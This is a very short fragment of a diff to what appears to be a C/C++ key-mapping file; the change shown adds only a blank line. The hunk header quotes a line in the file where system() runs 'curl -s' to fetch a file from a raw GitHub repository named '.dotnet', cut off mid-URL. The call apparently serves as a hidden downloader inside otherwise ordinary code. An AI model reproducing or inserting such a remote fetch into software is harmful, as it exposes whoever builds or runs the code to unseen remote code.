@@ -131,3 +131,4 @@ system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj
 	if(str == "RALT")			return 0xA5;
 	return 0;
 }
+
